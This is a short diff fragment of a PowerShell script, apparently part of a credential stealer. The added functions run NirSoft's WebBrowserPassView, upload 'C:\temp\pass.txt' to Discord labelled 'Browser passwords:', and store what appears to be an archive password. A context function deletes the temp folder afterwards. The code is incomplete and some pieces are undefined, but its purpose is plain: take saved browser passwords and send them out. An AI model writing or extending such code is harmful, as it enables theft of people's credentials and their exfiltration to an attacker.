@@ -15,3 +15,17 @@ function Del-Nirsoft-File {
   cd C:\
   rmdir -R \temp
 }
+
+
+
+function Upload{
+Upload-Discord -file "C:\temp\pass.txt" -text "Browser passwords:"
+}
+
+function Open{
+.\WebBrowserPassView.exe
+}
+
+function Pass{
+wbpv28821@
+}
